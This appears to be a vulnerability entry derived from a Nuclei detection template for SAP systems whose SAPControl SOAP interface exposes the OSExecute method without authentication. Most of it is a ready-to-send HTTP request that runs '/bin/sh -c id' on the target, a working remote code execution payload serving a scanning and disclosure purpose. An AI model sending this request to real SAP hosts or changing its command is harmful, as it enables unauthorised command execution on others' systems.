# Vulnerability: SAPControl OSExecute - Remote Code Execution (RCE)
**Classification:** MISCONFIG
**Source:** Nuclei Template (`sap-osexecute-rce.yaml`)

## Description
Detected SAP systems where the SAP Start Service (sapstartsrv) SAPControl SOAP interface exposes the OSExecute web method without authentication.

## Vulnerable Code Pattern / Exploit Payload
```http
POST / HTTP/1.1
Host: {{Hostname}}
Content-Type: text/xml; charset=UTF-8
SOAPAction: '""'

<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/">
  <SOAP-ENV:Header>
    <sapsess:Session xmlns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
      <enableSession>true</enableSession>
    </sapsess:Session>
  </SOAP-ENV:Header>
  <SOAP-ENV:Body>
    <ns1:OSExecute xmlns:ns1="urn:SAPControl">
      <command>/bin/sh -c id</command>
      <async>0</async>
    </ns1:OSExecute>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

